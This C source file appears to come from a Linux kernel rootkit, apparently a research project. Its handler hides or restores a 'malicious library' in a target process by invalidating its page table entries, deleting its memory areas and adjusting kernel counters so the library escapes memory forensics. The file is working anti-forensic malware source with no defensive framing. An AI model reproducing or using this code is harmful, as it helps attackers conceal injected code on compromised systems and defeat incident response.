/* pte_vma_delete.c -- invalidating or remapping PTEs
 *
 * Copyright (C) 2019 Patrick Reichenberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <linux/pagemap.h>

#include "rootkit_module.h"
#include "pte_modify.h"
#include "vma_modify.h"
#include "debug.h"
#include "pte_vma_delete.h"


int vma_rights_pv[] = {(VM_READ | VM_EXEC), 0, VM_READ, (VM_READ | VM_WRITE)};


/** pte_invalidate_handler - handles the technique of invalidating PTEs
*  @mal_lib_path: path of malicious library VMAs
*  @pid: PID
*  @mode: hide or reveal
*
*  Determines the VMAs and pages therein that need to be deleted or restored.
*
*/
void pte_vma_delete_handler(char *mal_lib_path, int mode, int pid) {
#ifdef MANUAL_MODE
    /* Required for nr_ptes adjustment */
    struct mm_struct *mm = find_mm(pid);
    unsigned long last_included = 0;
    struct nr_ptes_vma_track nrPtesTracker;
    int nr_ptes = 0;
#endif

    VIRT_ADDR va;
    if (mode == HIDE) {
        int status = -1;
        for (int i = 0; i < sizeof(vma_rights_pv) / sizeof(int); i++) {
            struct vm_area_struct *mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_pv[i], pid);
            if (mal_vma) {
                /* Invalidate the PTEs */
                if(vma_rights_pv[i]) {
                    for (va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value = va.value + 4096) {
                        invalidate_restore_pte(pid, va, mode);
#ifdef MANUAL_MODE
                        modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, mode);
#endif
                    }
                }
                /* Delete the VMAs */
                status = delete_vma(mal_vma, pid);
            } else {
                log_print(LOG_ERR, "Failed to find malicious VMA for PTE&VMA deletion.");
            }
#ifdef MANUAL_MODE
            /* Get nr_ptes to be changed */
            if (mm && !status) {
                nrPtesTracker = adjust_nr_ptes(mal_vma, last_included);
                nr_ptes += nrPtesTracker.nr_ptes;
                last_included = nrPtesTracker.last_included;
            }
#endif
        }

#ifdef MANUAL_MODE
        /* Adjust mm->nr_ptes */
        if (mm)
            atomic_long_sub(nr_ptes, &mm->nr_ptes);
#endif
    } else if (mode == REVEAL) {
        for (int i = 0; i < sizeof(vma_rights_pv) / sizeof(int); i++) {
            /* Restore the VMA */
            struct vm_area_struct *ins_vma = restore_vma(mal_lib_path, vma_rights_pv[i], pid);
            /* Restore the PTE */
            if (ins_vma && vma_rights_pv[i]) {
                for (va.value = ins_vma->vm_start; va.value < ins_vma->vm_end; va.value = va.value + 4096) {
                    invalidate_restore_pte(pid, va, mode);
#ifdef MANUAL_MODE
                    modify_rss_stat_count(ins_vma->vm_mm, ins_vma->vm_flags, 0, mode);
#endif
                }
            } // End restore PTE
#ifdef MANUAL_MODE
            /* Get nr_ptes to be changed */
            if (mm && ins_vma) {
                nrPtesTracker = adjust_nr_ptes(ins_vma, last_included);
                nr_ptes += nrPtesTracker.nr_ptes;
                last_included = nrPtesTracker.last_included;
            }
#endif
        } // End for
#ifdef MANUAL_MODE
        /* Adjust mm->nr_ptes */
        if (mm) {
            atomic_long_add(nr_ptes, &mm->nr_ptes);
        }
#endif
    }
}
